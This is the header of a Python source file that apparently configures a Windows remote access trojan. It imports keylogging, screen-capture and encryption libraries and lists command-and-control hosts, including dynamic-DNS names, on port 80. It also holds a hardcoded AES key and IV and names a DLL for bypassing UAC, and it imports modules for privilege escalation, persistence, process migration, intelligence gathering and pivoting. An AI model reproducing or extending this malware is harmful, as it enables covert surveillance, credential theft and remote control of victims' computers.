#-*- coding: utf-8 -*-
import os, shutil, platform, sys, threading, time, base64, subprocess, pyHook, pythoncom, ctypes, win32com.client, win32net, win32security, win32api, ntsecuritycon, urllib, argparse, random, socket, select
from PIL import ImageGrab
from PIL import ImageOps
import numpy as np
import cv2
from Crypto.Cipher import AES

MUTEX_NAME = "A long and unique mutex name. Nice, is it not?" # Unprivileged mutex name.
ADMIN_MUTEX_NAME = "A longer and more unique admin mutex name. Nice, is it not?" # Privileged mutex name.

mutexes = [] # List of mutexes.

HANDLER_IP = ["127.0.0.1", "dawajmito.ddns.net", "dnstunnel.ddns.net"] # Handlers to connect to.
#HANDLER_IP = "127.0.0.1"
HANDLER_PORT = 80 # Handler port.
sock = socket.socket()

marker = chr(1)+chr(1) #End of message marker

AES_KEY = 'brvty5b6BB7y56b754BBERBT' # Crypto keys
AES_IV =  'odiryvt93y489yrv'

EXECUTABLE_PATH = os.path.abspath(sys.executable) # Path to executable

UAC_DLL = "mscrv.dll" # DLL used to bypass UAC

import helpers, privilege_escalation, migration, persistence, communication, intel, interact, execute, mutex, ads, pivot